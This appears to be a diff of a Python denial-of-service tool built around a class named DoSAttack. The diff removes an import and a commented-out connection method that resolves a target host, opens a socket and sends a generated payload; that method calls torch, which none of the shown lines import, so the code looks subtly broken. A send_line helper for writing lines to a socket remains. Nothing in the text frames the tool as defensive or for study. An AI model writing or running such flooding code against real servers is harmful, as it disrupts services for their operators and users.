@@ -1,6 +1,5 @@
 import socket
 import random
-from .random_string_generator import RandomStringGenerator
 import logging
 import subprocess
 from urllib.parse import urlparse
@@ -16,21 +15,6 @@ logging.basicConfig(
 class DoSAttack:
     def __init__(self):
         self.threads = []
-
-    # def create_connection(self, url, target_port, model=RandomStringGenerator(100)):
-    #     try:
-    #         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    #         parsed_url = urlparse(url)
-    #         hostname = parsed_url.netloc
-    #         ip = socket.gethostbyname(hostname)
-    #         sock.connect((ip, target_port))
-    #         payload = model(torch.tensor([])).encode()  # Generate payload
-    #         sock.send(payload)
-    #         logging.info(f"Payload sent: {payload}")
-    #         sock.send(b"QUIT")
-    #         sock.close()
-    #     except Exception as e:
-    #         logging.error(f"Exception occurred while creating a connection: {e}")
 
     def send_line(self, s, line):
         line = f"{line}\r\n"
